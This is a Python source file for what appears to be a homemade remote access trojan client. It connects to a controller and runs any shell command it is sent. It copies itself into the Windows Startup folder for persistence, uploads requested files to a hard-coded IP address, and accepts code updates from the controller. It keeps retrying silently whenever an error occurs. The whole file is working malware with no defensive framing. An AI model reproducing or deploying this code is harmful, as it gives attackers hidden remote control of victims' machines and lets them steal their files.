import socket
import webbrowser
import sys
import os

def Main():
    HOST = socket.gethostbyname(socket.gethostname())
    PORT = 32444

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        while True:
            data = s.recv(1024)
            uncodedData = data.decode('utf-8')
            if not data:
                break
            elif uncodedData == 'rickroll':
                webbrowser.open('https://www.youtube.com/watch/dQw4w9WgXcQ')
            elif uncodedData == 'close':
                sys.exit()
            elif 'cmd=' in uncodedData:
                fullCommand = uncodedData.split('cmd=')
                command = fullCommand[1]
                os.popen(command)
            elif uncodedData == 'init':
                path = f'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.pyw'
                with open(__file__, 'r') as f:
                    read = f.read()
                    f.close()
                with open(path, 'w') as f:
                    f.write(read)
                    f.close()
            elif 'transfer=' in uncodedData:
                SEPERATOR = '<SEPERATOR>'
                BUFFER_SIZE = 4096
                host = '10.71.168.139'
                port = 43222
                filename = uncodedData.split('transfer=')[1]
                filesize = os.path.getsize(filename)
                so = socket.socket()
                so.connect((host, port))
                so.send(f'{filename}{SEPERATOR}{filesize}'.encode())

                with open(filename, 'rb') as f:
                    while True:
                        bytes_read = f.read(BUFFER_SIZE)
                        if not bytes_read:
                            break
                        so.sendall(bytes_read)
                    f.close()
                so.close()
            elif 'update=' in uncodedData:
                ssData = s.recv(4000)
                ssUncodedData = ssData.decode('utf-8')
                with open(f'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.pyw', 'w') as f:
                    f.write(ssUncodedData)
                    

def Start():
    while True:
        try:
            Main()
        except Exception:
            pass

Start()

